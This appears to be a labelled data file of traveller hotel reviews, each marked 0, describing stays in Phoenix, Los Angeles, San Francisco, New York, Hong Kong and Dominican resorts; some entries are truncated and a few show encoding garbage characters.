"mediocre by expected standards, and in the midst of a renovation i stayed at this facility while attending the american legion's national convention; this was the property to which our delegation was assigned. in terms of what i would expect from the embassy suites brand, this was mediocre to disappointing. the property itself is in a marginal/transitional part of the city, and is not particularly convenient to many of the major attractions in the phoenix area. a traveler staying here would definitely need a car to get around. it is an older facility, though would have much promise with a major upgrade. the rooms are relatively spacious, but a bit spartan and worn. the entry doors were marginally secure. the walls were thin, so any external noise from outside or in adjacent rooms were sometimes quite audible. some of the electrical outlets worked part of the time, or not at all. the air conditioning was spotty at times. the in-room refrigerator was slow in chilling stored beverages or food items. the bathroom is incredibly small; you very nearly had to step over the toilet to get into the shower/bathtub. the beds were small and rock-hard, which - combined with the spotty air conditioning - could make restful sleep problematic. the televisions were old and in poor working order, and the cable system was even worse, as several featured channels were nothing but snow depending on the time of day, or even the room you were watching in.general cleanliness of the facilities was so-so. housekeeping was open to the outside, and cleaned bath towels were stacked near the entry, which almost made laundry pointless. laundry facilities were also outside; while the washer and dryer units were relatively clean, there was no place to fold or stack. additionally, quarters were virtually a precious commodity in the hotel, and $1.00 only bought you 20 minutes of drying time. housekeeping services were ridiculously slow and late-arriving. it was not uncommon during the week's stay that your room would be left unserviced until as late as 4:30pm. on average, housekeeping would not arrive until about 3:30pm. my two or three experiences with the front desk staff were generally poor; they did not seem knowledgable about their own property or the area, and could not meet my requests (see above with obtaining quarters for laundry).the saving grace to this property was the agave cafe, their on-site restaurant and bar. the staff was very polite, friendly, and responsive - even in busier periods - and the food selection was very good and generous in portion size. lunch and dinner prices were as to be expected for hotels. again, this property was not what i expected from what i knew fo the embassy suites brand. this property was undergoing a renovation during my stay, which appeared to include a complete rebuild of the guest suites. if they do an extensive renovation, there is some promise to the property, but they will have much work ahead of them to make it a place i could recommend to other travelers.",0
"not up to expectations we stayed at the hotel for 3 nights in january 2006, and have to say that it just did not live up to our expectations. it has been rated consistently as one of the world's best hotels for years and we were looking forward to our stay there. we had booked a room in the tower, as recommended by many visitors, but upon check in, they offered us a huge suite in the main building for the same price, which we took. it was nice, if somewhat",0

"wonderful choice for la we are discriminating travelers and so always worry when we try a new hotel. we were on our way to the desert with our children (ages 12 and 17) and wanted to stop in la for a night. anyway, we arrived at 7:00p and were promptly greeted by the parkers. upon checking in, we asked to have both rooms nearby which was not available. so angel, at the front desk, was so kind to upgrade us, as spg clients, to a full 2-bedroom suite. that evening, we dined at the hotel's restaurant, 930, and had jeffrey, a wonderful waiter. while the food and wine was pricey, all five of us enjoyed our meal and the incredible service. the room was contemporary but comfortable with nice flat screen tv's in every room (even the bathroom) and bliss products. we only had a few complaints: the bottled water was $9 . . . how silly; the parking was $31 . . . why not include it; even though the bathroom is large, it is not well-designed as there is no area for make-up, hair brush, etc. and the make-up mirror is right next to the shower door. finally, the air conditioner knocked in the morning which needs to be addressed. the bellman are extremely kind and they got the bill exactly right. we'd stay there again.",0

"ok for the money location is great, convenient to i-10, tempe and south mountain. hotel is clean, but showing its age, and has some minor maintenance issues. for example the bathroom exhaust fan only worked intermittently, and looked like it was going to fall out of the ceiling. it took several minutes (5+) to get hot water on the 5th floor. most mornings the shower was cold. the hotel staff, although friendly and helpful, seemed in denial that we could possibly have problems with hot water. they did agree to turn it up and we finally had our hottest shower on the last day. for some reason housekeeping shorted us on towels and coffiee packets on occasion.we had a one-bedroom suite, which was very nice considering we were travelling with a 1-year old. he had his own room, and the curtains were very dark so he could nap during the day. they advertise complimentary cribs when available, although they tried to tell me it was $10 a day when i called them directly to make the reservation. the sheet provided with the crib was not fitted, but was just a folded, full-size flat sheet. fortunately, we brought our own fitted crib sheet which worked much better.the hotel advertises complimentary high-speed internet, but that really meant free wifi in public areas of the hotel only, and some rooms had wired connections. our room did not have a wired internet connection, but since it overlooked the pool area, we were able to get intermittent wifi connections.some rooms come with complimentary breakfast for two. ours did not, since we received a discounted rate. however, there is a mcdonad's within walking distance next door, and a safeway and several restaurants nearby.",0
"great value; not quite perfect room: double classic for 4 nightspros: super clean, sofitel style decor (dark wood). bathrooms vary, but generally adequate size. nice details- built in wardrobe with ample room and safe; most rooms seemed light filled with views of garden, courtyard or street; semi-firm beds with crisp sheets. cons: overall, staff are professional, but exasperated. examples: requested double bed on reservation (had actually called hotel directly)- only twins available at check-in; response from staff was akin to take it or leave it. the next day they did put beds together, which was surprisingly comfortable- did not really feel any gap. shower alternated between scalding hot and cold water- staff response was that was not a problem, but when pressed, admitted there may be issue with whole building's water system. they did reduce our room rate for inconvenience. felt we were bothering staff with these concerns, but requested room type and functioning facilities should be basic in any level of hotel, in my opinion. hotel also recommended 2 late night pharmacies, which actually were not open at night. other minor issues: poorly stocked mini-bar;",0

"any closer to the airport and you'd be under a plane! i arrived at la airport with no accommodation booked for a 20 hour layover and got on the sheraton shuttle bus thinking this was a hotel brand i can usually trust. as usual the sheraton lived up to its expected high standards.my mini suite was perfect. clean, spacious, crisp linen etc. the leather couch was perfect for an afternoon nap in front of the tv. i am actually surprised to read other reviews noting they found this pricey - i found it far cheaper than comparable accommodation and actually asked the receptionist if i had in fact heard the price right it seemed so cheap!the shuttle to the airport was literally minutes and i was assisted on and off both ends by the driver (always a worry getting luggage on and off when you are a female travelling solo).the only minor disappointment i will note is that room service is not 24 hours. being so close to an international airport i was more than a little annoyed i could not get a proper meal because it was 9am la time even though i had just gotten off a 15 hour flight from australia and desperately wanted something more substantial than a bagel!overall though i definitely recommend this place and will definitely stay here again in future.",0

"they should pay you to stay in these rooms the flight we had to phoenix was overbooked and we were offered a flight that would depart the next night for free. it was midnight and we decided to stay close to the airport. after renting our car for the next day, the attendant recommended that we stay at the best western plaza near the airport, since it was clean and nice. since we could think of many hotels from this chain in our own city that were nice, we decided to stay here. that was a big mistake. this hotel is nearly impossible to get to because it's under the freeway so you can't see it when you exit the airport and you're looking everywhere for it. there were like 3 rooms left when we got there. we got to the room and were shocked. our main problems with the room were 1. smokey smell, 2. three burnt out lightbulbs, 3. disgusting bathroom (i couldn't take a shower like i had planned), 4. carpet with so many stains on it that you'd think they made the pattern on it, 5. a coffeemaker that leaked coffee all over the counter when in use, and worst of all, 6. the inability to sleep due to the fact that it's 20 feet from a major highway. i remember telling myself they should just demo this entire place and build a new building if they plan to have guests in the future. in my opinion, they should rent these rooms by the hour. and as for parking, forget it. we had to pay their daily parking fee of $8 (even though our car would only be there for about 6 hours), and there were no spaces left. they claim to have a restaurant and gift shop. i didn't do either because we were dying to get out of this place the next morning. i wouldn't even recommend this place for budget travelers because the going rate for these rooms is awfully high. what a letdown from bw.",0

"lovely hotel my boyfriend and i stayed at this hotel on the 23rd august for 3 nights and had an enjoyable stay. it is in a great location, 5 minute walk to fisherman 's wharf promenade and 5 minute walk to a tram stop.we were given a room over looking the street which proved to be noisey. the reception staff were very accommodating and said the hotel was fully booked but first thing in the morning they would move our luggage to a room over looking the courtyard. this room was alot quiter and you could also open the windows as apposed to the room on street level.the complimentry tea and biscuits in the morning were very good and the restaurant ajoined to the hotel was very pleasant.the hotel was clean, in a good location and we would reccommend it to other travelors.",0

"service is questionnable at the millenium biltmore... we expected more of the millenium biltmore and from the start, they totally and completely missed everything that is important to have a quality hotel.first, we arrived and there were some larger events (its 9:00 p.m.). it took us 30 minutes to even get close to the parking/valet area. ugh! we then checked in (knowing we had 9:30 p.m. reservations at their restaurant. it is published as being open till 10:00. the desk did call to say we would be late.)we then asked for our bags to be taken to the room so we could go to dinner. no can do - the bell hop said - you must be in the room and we cannot deliver for 15 minutes. we explained our dinner reservations and he said - too bad! he did relent and take them up about 5 minutes later.we then got to the restaurant at 9:40 p.m. ugh! we were basically blasted by the extremely unfriendly hostess - this lady should get a new job!!! she is one heck of an unpleasant person to deal with and said - you are bad people - you did not call to cancel your reservations - we are closing the restaurant now - we won't seat you. get out! ugh! here we are hotel guests - who have been mistreated by the hotel - and here we are getting yelled at.we then went upstairs to talk to the front desk. ugh! he suggested a couple of places we could have dinner....he said only a few blocks away. we arrived at 2 of them and they both were closing at 10 p.m.we then asked the last place - know of any places that stay open. luckily the standard does! and the standard hotel actually has great food and a fun bar area!we then went back to our room. the toilet was broken....we had to wait an hour for it to get fixed. we also found the bathroom extremely tight corners. ugh!for the price, its not worth staying here....we did find the room service menu to be good and enjoyed the room service japanese breakfast. of couse, when we got to use their in room check-out, it too was non functional. it took a bit to get the car to the front door by the valet - (note: the morning bell hop was wonderful and timely.)but in short----service here! only if you want to get yelled at; told wrong information; mistreated. (by the way we went to the bar and it stayed open till midnight - no munchies on the menu; and when they did not realize they had customers at the bar, we simply moved on up to the room.",0

"great location, average stay at best! the good - i am originally from new york city, so i am well versed in the offerings downtown. the location of this hotel is outstanding being on the corner of third avenue, and 34th street. away from the hustle and bustle of times square but close enough for a healthy walk if you plan on going to the theatre district. if you are interested in the allure of downtown, including union square, washington square (nyu), soho, tribeca, and the west village, also a healthy but doable walk. as part of this downtown trek you will learn to love the offerings of the area between the murray hill district and downtown. restaurants and shopping galore.the price is also right for this hotel having secured a 26th floor room (view not good from our vantage point, but not there for the view) for $215.00 a night. this is the place to stay if you are interested in what nyc has to offer, yet you dont want to pay truly high prices for a room.the bad - when we stay in ny, the last thing we want to feel like is that we have rented a converted studio apartment and this is clearly what this hotel has to offer. studio apartment rooms full with out",0

"laud the legacy i have been visiting the legacy golf resort on 32nd st. in phoenix regularly for the past 3 years and plan to continue to do so in the future. in comparison to other resorts in the valley of the sun i find that their golf course, accommodations, ammenities, and staff represent the valley's best golf resort value by far. the golf course is kept in superb shape even in the heat of summer. the course is challenging, but a fair test for golfers of any ability. the practice facilities are extensive. the golf shop has a great selection of golf apparel, and you get a 25% discount just for filling out a questionaire. swimming pool, restaurant, tennis, sand volleyball, hot tub, are also on property. each morning guests have announcements on voice mail of planned activities available for that day. a one bedroom condo, will provide you with everything you need for a short or extended stay. washer, drier, complete kitchens, stereo, 2 tv's, double vanity sink, jetted tub, separate room with standing shower and another single vanity sink, dishwasher, balcony, and dining area. even the studios have dishwashers, washers, driers, fridge, sink, microwave, and 2 burner range. the area around the legacy has restaurants at arizona mills mall, movie theaters, and other attractions close by. finally, i have found the friendliness and helpfulness of the staff to be all that a guest could ask for. carol who has taken my reservations, to the girls at the registration check in desk, to louie and joe who are starters on the course, to moto, one of the cart guys, to nick zell who has given me a lesson or two, to chris, the head pro, to chris morrow in time share sales -- there are others, i just don't know all their names. the impression i get is that their friendliness is sincere. they come across as real people, being nice because that is the way they are, rather than the robotic types that serve you because they are paid to do so at other resorts i have visited.i look forward to my future visits. nick, next we tackle the short game. lolsubmitted by allan popsack",0

"nice room but... my two adult sons and myself stayed for just one night at the omni. the check in, after doing the on line checkin, was great! everything including my breakfast slips and room key were in an envelope with my name on it ready to go. the room was perfect and very comfortable. the staff was very helpful as we wanted to walk to staples center for a concert and they told us the safest and quickest way to go. the breakfast the next morning was my only complaint. we had a total of nine people, six of whom had stayed at other hotels in the area, that all arrived to eat together. the buffet was awesome! the food ordered off the menu was above average but the service was horrible! i had to leave the table, after requesting a coffee refill four times, to find someone who would bring us more coffee. (it was our first refill, not fourth or fifth) another one from our party also had to leave the table to obtain minimal service. i own a restaurant, and tend to be sympathetic to overworked food servers, however, this was not the case here. no more than six other tables in use in the entire restaurant, and our server stood talking to other staff for over twenty minutes while we waited. the room and the hotel is fabulous. don't expect much from their breakfast service",0

"absolutely amazing vacation! we wanted to write a long and detailed review to explain just how great of an experience we had and why we will be making plans to go back as soon as we can....my boyfriend and i returned from bp bavaro a few days ago, and had the most perfect vacation. we literally had zero complaints about our stay-- the room, the grounds of the property, the food, the drinks, the staff.. this place was above beyond anything we had ever expected. we truly were treated like royalty. prior to taking our vacation we read several reviews that had complaints; after a few days at this resort it became clear to both of us that those who had or would complain are those who are totally ignorant of their surroundings. beach: the most beautiful we had ever seen. our main requirement for this vacation was white sand turquoise water-- if you're looking for the same, this is exactly what you will get... it really is paradise (especially considering the beach bar located only steps from the surf). there are several water activities going on throughout the day, mostly at an extra cost-- we spent most of our time swimming in the warm sea and soaking up the sun.pools: all of the pools on this resort are well maintained and manned by friendly, accomodating staff. like anywhere else in the world, they are appreciative of tips! one of the things we noticed was that few people actually tipped the bartenders, but if you gave a dollar every few drinks--trust me, they take care of you (especially if you ask for mucho rum!). the main pool by the beach can get busy, but this is a positive thing-lots of people watching to do and things to experience. nightlife: again, no complaints here!! at the end of our day at the pool/beach we would go for dinner at either the buffet or restaurant then head to the pueblo principe (the square located by the reception). this is probably one of the most attractive parts of the entire resort, lavishly decorated with marble floors, grand ceilings, live entertainment, and staff who are at your beck call (literally). here you can sample several drink choices which can become quite entertaining; there is much to choose to from. this square closes at 11, and most people head to the principe town, where there is a stage that hosts live shows (comedy, etc--very good!), a karaoke bar, a disco, a casino. this resort is not a huge party place, but if you are looking for a mixture of r r, and a party, you can do it here. food: you have a choice of 3 a la carte restaurants- we chose the steakhouse, the seafood, and the japanese (entertaining). all 3 were really something to talk about. there is something here for everyone. we enjoyed the steakhouse the best; each a la carte has an appetizer buffet prior to your entree. throughout our stay we ate at both the breakfast, lunch, and dinner buffets. keeping in mind that this is a resort that accoma",0

"certainly lived up to the good reviews! if you are not looking to spend a fortune on accommodation in nyc, the chelesa lodge is ideal. well located in the fashionable and hip chelsea, but on a very quiet side street, it is close enough to walk to the midtown sights or grenwich village, soho etc.rooms are indeed immaculate and not as small as i thought they might be. we had a garden view from the back, which probably also made it quieter. to echo other reviews - the shared toilets really are not a problem.highly recommended for independent travellers who don't want the same old 'corporate' chain hotel experience.",0

"FS: The New It HK Hotel I stayed at the new Four Seasons in Hong Kong from 17 to 20 February 2006. It is, without a doubt, the It hotel in the SAR; I found that, in overall appeal and service, it just edges out my two other HK favorites, the Peninsula and Ritz-Carlton. The FS really does have it all: (1) Location - perfect, attached to the IFC Mall and adjacent to the HK Airport Express Station. It's a short walk or taxi ride to anywhere, including the Star Ferry, in Central. Yet it's also somehow set apart. The property comprises two towers: the hotel proper and residences. (2) Rooms: I stayed in a Harbour Deluxe room, at a promotional rate that included HK$500 toward in-room or hotel-restaurant dining. While it was mostly foggy or rainy during my 3-day stay, the view of the busy harbour and Kowloon was inspiring. The decor is smart, sleek, and new-millenium luxurious: lots of dark woods, marble, and glass. The main TV is a huge plasma unit, with a smaller LCD screen over the bathtub. The bathroom is very luxurious, with a large soaking tub and walk-in rain shower. (3) Spa: the best I've seen to ",0

"It's getting there... My parents and I stayed at EdenH Feb. 26 é¥?Mar. 3. A little background: Ié¥?? in my mid-20s, parents are in their early/mid 50s. This was our second trip to the Dominican Republic and fourth time staying at an all-inclusive resort. We booked through Signature Vacations and flew with SkyService out of Kitchener. We were pretty nervous and unsure of what to expect after reading all of the mixed reviews, so we were pleasantly surprised. The place was beautiful, the staff was very friendly and helpful despite being overwhelmed by the large crowds, and we had a good time.CHECK IN/FRONT DESK: We had some issues with our plane so we didné¥?? arrive at EdenH until 5:00 am on Feb. 26. Check in was quick, no problems there. We had requested an ocean view room when we booked the trip but didné¥?? get it, though we were not really expecting to. We learned while checking in that the hotel was fully booked for that week so we didné¥?? bother requesting to change rooms or to upgrade (we had green bracelets). We stopped in occasionally throughout the week to ask some questions at the front desk and staff was always friendly and helpful. No, their English is not fluent but they do try their best to help you out.ROOMS: We were in rm. 1217 facing off the resort. Previous reviews have mentioned that these rooms overlook a local é¥?¸?lumé¥?but when we were there, that area looked clean and was pretty quiet. The room was nice and clean. The beds were the most comfortable hotel beds weé¥???e ever slept on! The room was cleaned every day and our toiletries got replenished as well. For some reason, kleenex and washcloths werené¥?? replenished, but the woman who did our room that week was very nice about getting those things if we asked. Our biggest issues with the room were the lack of privacy in the bathrooms and the mosquitoes. The glass and tile in the bathrooms really do create an echo chamber and the lights shine right onto the bed through the opening in the wall. We came prepared with an old shower curtain and painteré¥??? tape, so this wasné¥?? too bad for us but it really is an awkward setup. As for the mosquitoes, we killed anywhere from 6-10 of them in our room daily and did come home with several bites despite using repellant and despite EdenH staff fumigating daily. Again, we came prepared with a fly swatter, but we didné¥?? enjoy having to fight off mosquitoes every time we were in our room. FOOD/DRINKS: The food at the main buffet is pretty average all-inclusive fare. They change up some of the dishes from day to day, but it does get monotonous after a week (as it would anywhere). At peak times, it was hard to get a drink or get tables cleared until people were almost done their meal. It seemed like they were understaffed. The beach buffet was great and thaté¥??? where we found the freshest, best cooked food. The food temperature was hit or miss but most of time, mine was at least still lukewarm when I got to my table. The highlight was Felix at the omelet station every morning. He is fantastic! He gets to know everyone and is a big fan of hockey and baseball, so he knows your local team and the results of games from the night before. Heé¥??l remember you when you come back the next morning and always greets you with a big smile. We found the best drinks were made at the pool bar and the sports bar. Other reviewers are right, each bartender makes the same drink a different way so you never really get the same thing twice. For non-alcoholic drinks, Yanira at the sports bar makes a great cappuccino. The a la cartesé¥î?e managed to try all four of them once. On our first day, I got in line for the Shore Grill at 5:30, and then waited until 6:30, when the hostess would start going down the line with pagers. I was able to get one, but the lines were quite long and many people werené¥?? so lucky. The next night, the system had changed and they were giving out pagers at 5:30 instead. They continued this system for the rest of the time that we were there. We thought this worked pretty well; it prevented the lines from getting too long and we were happy not to have to spend all of our afternoons in line. The food everywhere was good, the Italian restaurant had some of the best lasagna Ié¥???e ever tried. The white wine was also excellent. The service was inconsistent, though. The Shore Grill and the Italian restaurant were very understaffed. There was only one person taking orders on the nights we were there, so they were limiting the number of people that could come in. The food was very slow to arrive after we ordered there. Be prepared to spend at least 1.5 hours in the restaurant once you are seated. The French/Romantic restaurant was our favourite, the staff was well trained and efficient. Yes, the dècor is tacky but we just had fun with it. The Asian was good as well, we sat at the hibachi and enjoyed it. Unlike some of the previous reviewers, we had a good experience with Nancy, the hostess at the French/Asian restaurants.BEACH/POOL: The beach at EdenH is gorgeous. Easily the nicest, largest, and best maintained beach in its area! It was generally clean, though after a few days (when the wind picked up) we did start noticing some broken glass and other random debris in the sand under some palapas. The pools are all beautiful as well and the water was not cold. The chair situation wasn't too bad for us, but it was pretty ridiculous in general. The first two days, we didn't bother with chairs but on the third, my parents started getting up to watch the sunrise and then saved some chairs between 6:30 and 7:00 am. They had no problems finding three chairs at that time. During the day, walking along the beach, at least half of the chairs were not being occupied and we did see people saving multiple sets of chairs for themselves in the sun/shade. A notice was put in the hotelé¥??? daily newsletter about chair etiquette, but it appeared that most people either didné¥?? see it or just ignored it. Yes, there is a chair shortage but there is also an abundance of selfish people. I have since read that the shipments of new chairs are starting to arrive and some form of chair policy is being enforced, so hopefully things will settle down.ENTERTAINMENT/ACTIVITIES: There were shows every night, usually in the central plaza area (though I believe the indoor theatre is now open) starting at 9:45. We saw the Dominican Folklore show, which involved traditional Dominican dancing and music with a group from Santo Domingo. We also saw é¥?·? Swinging Affairé¥?(my personal favourite), with two singers covering some of the classic jazz and swing songs. There was also a White Night party, which was pretty much an hour of dancing to club style music with men on stilts, mimes, and other people in white costumes dancing around with you. It looked like fun, but we were too tired to stay up for the whole thing. During the day, there are dance lessons by the beach buffet (lots of fun!) and occasionally a bar show or cigar show there too. Thereé¥??? a daily newsletter in the lobby that tells you whaté¥??? happening that day, but beware: when we were there, the daily schedule was the same every day (except for the nightly shows) even though there were different things going on at the beach in the afternoon. Be sure to ask around so you doné¥?? miss out on anything!OVERALL: We enjoyed our time at EdenH and had a good vacation despite the bumps along the way. We were treated well and never felt like second class citizens with our green bracelets. Would we recommend this hotel to others? It depends on the type of place you're looking for and the type of person you are. They are trying to respond to guest feedback, we felt like they were genuinely interested in improving things. They really do work hard to accommo",0

"Riu Palace Punta Cana - No Thanks for the Memories! My hubby and I just got back from the Riu Palace Punta Cana last evening after 7 days in the resort (Monday to Monday). Upon arriving at the airport we were taken back by the 50's style airport --open air, the plane pulls pretty much up to the front. Gates 1 - 4 are open air and gates 5 and up are a/c. Be prepared to move quickly cause it is extremely hot in the airport. Upon getting our luggage the baggage boys were all over us like white on rice to take our bags to the bus. Let them do it, it will save you a lot of stress and you only have to slip them a couple of dollars (they're very appreciative of anything you tip). Our bus ride was interesting as you get to see much of the depressed countryside. Some areas are really saddening to see. After dropping off passengers to their respective hotels we finally got to see ours, breathtakingly beautiful. Like a palace!!! Pristine exterior and landscapingly appealing---we were impressed. The lobby is absolutely gorgeous and spacious. The desk clerks are very helpful and do their best to accomo",0

"unexpected excellence we stayed at this hotel for the seeds of compassion event in april 2008. we needed a central location for seattle center/uw/qwest field. parking was $15 per night, reasonable for seattle standards and as a crown club member, our parking was front door center... we also got to leave our car for the day we checked out. first impression always is the front desk, we were met with friendly smiles and excellent service from start to finish. i spend about 40 nights a year in hotels and this was the best customer service i've experienced in years. upon checkout we received perfect directions to the location we were headed on foot. the location was perfectly convenient, the room was nice sized, clean, and enjoyable. free high speed internet was a plus. we enjoyed our view of the space needle and the seattle center carousel. especially convenient was the location going back and forth to seattle center, getting downtown, pike's place, etc. hands down our new place to stay in seattle.",0

renovation nightmare! this was suppose to be holiday of a lifetime! holiday was booked in nov 05 through first choice signature (mean't to be a reputable firm!). three weeks prior to our travel they told us the hotel was under extensive renovation! apparently this had been going on since oct 05 and the managment knew that it was unlikely to be finished in time! nice of them to tell us!they stated it would not disrupt our stay only that:1.) we would have to get a shuttle bus for 1 hour (return) to another hotel across la as the pool was closed!2.) no fridge in our room3.) there would be noise from 9-6pm each day4.) it was all due for completion the day of our return!they added after all this we wish you an enjoyable holiday!it was noisy and the work did disrupt our stay! definately not recommended!,0

"where you want to be as with any location in downtown sf size will be an issue when it comes to accomodations. however, most people don't come here to rough it out in thier hotel room and if they are then they probably shouldn't want to stay in downtown sf. as everyone has reviewed the location can't be beat, you are in the mix of everything, barely a block away from union square. if you want shopping this is it!!! that was the reason for my trip i wanted to do all my x-mas shopping in the city. i think this will become a yearly tradition.i had a room with 2 twin beds so my bf and i just pushed them together to make a semi-full sized bed. there was a little vanity area and closet sufficient for all my shopping bags. it really would not be condusive for more than 2 adults though. check-in and out was a breeze and they do have computers in the lobby that you can rent if you need to check emails. we parked in one of the many garages in the area, they may have valet but everything is so close you really wouldn't need your car till you leave so a garage will do just fine.",0

"honeymoon disappointment never again!!!!!! to whom it may concern:the purpose of this letter is to voice our discontent with the honeymoon package that we purchased through agence de voyage sears and vacances signature. as is plain and evident a honeymoon (aug 16 2003) comes only once in a lifetime and can never be redone, so we try to deal with reputable companies so as to minimise the risk of things going wrong and increase the probabilities that we will be treated with é¥?·­lcé¥?especially that it is our honeymoon. with this in mind we chose sears and signature to be the ones to handle our special two weeks together. i guess they can not be held responsible for the actions of the people at caribe club princesswell, let the journey beginé¥?br/we arrive to the dominican republic bright eyed and as happy as two little puppies who just found a new home. we stood there in the lobby waiting for our special greeting and express check in, which of course was promised to us as part of the honeymoon package. we stood there for a good 15 min, only to realise that that was not going to happen. well the next step was to wait in line behind the 20 or so people that ended up in front of us since we waited for the express check in. about 45 min later we get to the front desk, a little bit tired, yet still happy to be there. that quickly changed.. they dropped a bomb on us, we were told that we were not booked in the honeymoon package. after a good argument and a nice little bribe to one of the employees (50.00 usd) it was settled.. we miraculously seemed to be booked in the honeymoon suite (which was not on two floors as promised by the representative at sears). ok so on to the room, the bellboy takes our luggage and leaves, we assume to bring it to our rooms. so we follow the person from the front desk. it seems that since we gave a little gift he now wanted to treat us as if we were vipé¥???. we arrive to the room all happy, we open the door i pick up my new bride and carry her through the customary threshold and put her on the bed. only to realise that the bed had no sheetsé¥îot to mention it did have a few stains on it é¥îit of a turn off you could say. no matter, it is our honeymoon so let it slide, we call for sheets and were told that they would be there in 5 minutes, we say ok no big deal. ok so lets open the bottle of champagne that was supposed have been there, guess what? no champagne, and we just realised that there were no flowers as promised. what else was missing? our luggage was still not in the room even though it was taken from us before we left the front desk, so of course we start to panic and call the front desk again. we were told it would be there in 5 minutes, ok we say. we ended up waiting an hour before we get our luggage and we never got the bed sheets until the next day. the next morning we laughed at what had transpired the night before and said we would not let it affect our honeymoon. the room was beautiful in the day light and we wanted to open the beautiful wood blinds that surrounded the jacuzzi that faced the ocean, only to realise that they were broken. well once again we call the front desk to get some one to come and fix them; they transfer us to another department who only spoke spanish, which is ok because i speak spanish. about an hour and a half later a person came to look at the blinds and told us that they cané¥?? be fixed, we told them that that was an unacceptable answer. they told us that is was no big deal, all there was to see was the beach, nothing really interesting (hello!!! we came to this country to see exactly that...the beach). as you can imagine, we stood there completely stunned at his answer. the person left and we decided to roll up the blinds ourselves and tie them up with the cords that were supposed to make them rise.(we could finally almost see the beach) when we opened them we realised that the windows were so dirty that it was hard to see the beach. then all of a sudden some one is at the door guess who? the cleaning lady with our bed sheets... glad to see her we introduced our selves and asked her politely to please clean the windows or have the person who cleans the windows do so. she said it would be taken care of later, we thanked her, and then asked her what these strange looking things in wood were around the jacuzzi? she said that they were candle holders and that we should have candles on them, she said she would take care of that also. we thanked her again and she left after putting the bed sheets on the bed, who by the way were absolutely amazing and very clean. well we now decide to go to the beach and work on our tans. when we get back we are stunned to see the place was filled with cockroaches! we killed three of them and left them on the floor so as to show the people working there that we are not just complaining. they sent someone there right away he then starts to fumigate the room. we told him to hold on because our clothes were out of our bags, but he continued and for the next three days our room smelled really bad not to mention our clothes stunk. when we asked the front desk for another room we were told there were none available. a couple of days go by, all is well.... we called a few more times for them to clean the windows and bring the candles they never did so we decide to clean the windows as well as we could without any cleaning products. this, as you could imagine, angered us but we gave up trying to get things done by calling. not surprisingly, every day we went to the front desk to speak to our signature representative and he was never there! when we would ask where he was, we were told that he just stepped away for a few minutes. after a week of trying we realised that we were on our own and gave up leaving messages for him. a day later, after going to the beach we come back to the room around 7 pm to realise that they had left with the bed sheets again, but this time they had taken our bath robes as well. i was not going to let this happen. especially since there was a nice little sign in the room that states that if we decide to keep any bath robes we would be charged 50.00 usd, so i call for the sheets and the robes, we go to eat supper and around 11.30 pm we return to find that they have brought the bed sheets but not the bath robes so we call to make a complaint.the next day we met our saviour é¥?·anielaé¥? she did as much as one person could possibly do, she got our bath robes back, she got our candles (a week later) to us. she also made us realise that we should have gotten a bottle of wine in our room, which she tried to get us for a few days before we actually did. she also tried to get us the champagne and flowers in our room but as hard as she tried she could not do everything and we were grateful just for the effort that she was doing.(an excellent employee by the wayé¥? the next day, which i do believe was on the seventh day, the key to our room stopped working and we were told that we were only booked for one week, that was when i could not take it any more. i called and gave a piece of my mind to the front desk. they then told me to wait in my room until they will send some one there to fix the problem. the person showed up and told me that i had to go to the front desk to fix the problem so i sent my wife to the beach so she would not lose the sun and i went to the front desk. they apologised to me and gave me two new keys. i left from there frustrated but decided to go to the room and test the keyé¥î?­uess what? it did not work, so off to the front desk where on my way i met up with daniela. she told me that she would take care of the problem for us again when she called she was told that i should stay in the room waiting and they would come to bring me the new keys.. so i did it took 3 hours and daniela and i could not believe what was going on. just to say once again, daniela saved usé¥?lets talk about the room service that did not exist. not once of the 5 or so times that we ordered did they get the order correct. not to mention, the only reason that we could use room service is because i speak spanish, otherwise if you do not they will not understand you. to the point where once my wife called to order and they did not understand what she was saying so they left the phone off the hook with her waiting for 15 minutes until i got to the room and decided to call the front desk and complain. so the front desk tried to get through and could not because the phone was off the hook with us on the other line. the person at reception could not believe what was going on. once again we let that slide but we were not happy at allé¥?leté¥??? talk about the supposed included activities. what a jokeé¥?you cannot make an appointment unless you come at a certain time in the morning to do so, and you cannot make an appointment for a future",0
"excellent location, friendly staff, clean and pleasant rooms i was forwarned to expect small rooms, but i thought the tuscan inn had rooms typical or even generous for an urban hotel -exceeded my expectations. our family of 2 adults and one teen was comfortable with two double beds. the hotel has recently been refurbished, and was very clean and comfortable. our 4th floor room was street side so there was some traffic noise at night, but not so much that it bothered any of us. all the staff was excellent, but the concereige, clay, really went above and beyond to help us find our way around san fransisco. i was very delighted with the pleasant and professional hotel staff all the way from the doormen to the desk clerks. the hotel has a wine reception from 5-6pm every evening which is a nice touch. the location was excellent - near the waterfront, the aquarium, pier 39, giradelli square etc and very easy walk to cable cars, trolleys and bus routes. we didn't rent a car and instead bought a 3 day transit pass for 18pp which saved alot of money considering our frequent use of the cable cars especially. it was very easy to get around using the transit system. we had a wonderful time in sf and the tuscan inn was a part of it.",0

"great stay and would return!! we stayed 3 nights at squaw peak and had a very nice experience. we checked in late (around 9:30pm) on sat., march 31st and received an updated suite in the north building.the main pool was a lot of fun. it was open from 8:00am-8:00pm during our visit. when you checked in you were given a wrist band and plenty of towels. we went down early both mornings and got a spot by the upper pool with the basketball net. people were reserving chairs but i always saw available chairs around.we enjoyed two great days at the pool. my children ages 8 10 met a lot of other children and enjoyed all of the activities they had going on. some examples of the activities are: water balloon toss, water slide races, musical chairs and a watermelon eating contest just to name a few. i am not sure if they always have so many activities going on or if it is because it was the week before easter (spring break) but my kids had a blast participating in them. also, the college age guys/girls running the activities were super nice!! winners even won prizes which were tickets for free smoothies at the snack bar. this was a good deal because if you paid for them they were $5 in the back of the gift shop there is a candy counter/icecream shop. get your sodas there... a lot less expensive and a lot bigger.we ate lunch both days by the pool ordering from the snack/pool bar. the food was expensive and pretty good. we know what resort prices are and were not surprised. unfortunately we did not get to eat at hole in the wall restaurant (my daughter became sick on the trip) we did order pizza from streets of new york which delivered to the resort and was excellent. the day we left we had lunch at aunt chilad's which is in walking distance and is very good mexican.we thought the rooms were very clean and well furnished. the beds were very comfortable. we did not have any noise issues. housekeeping did a good job and things were all in good working condition.the kids enjoyed the quiet pool right outside of our building the night we arrived because this was open until 11:00 pm. we had a great stay and would go back again.",0

"problems with staff we stayed here for three nights for our trip to the orange bowl. the property could use some maintenance and the attitude of the staff could definitely use some improvement. two out of the three nights there was no parking available for us. the night we returned from the football game, the guard who was locking up the hotel parking lot actually told us to go away! we told him we were hotel guests and had paid the $12.00 parking fee and he still told us to leave! we were left to find alternative parking after midnight in what can only be called a dodgy part of miami. i would not recommend this hotel based on location, facilities and staff.",0
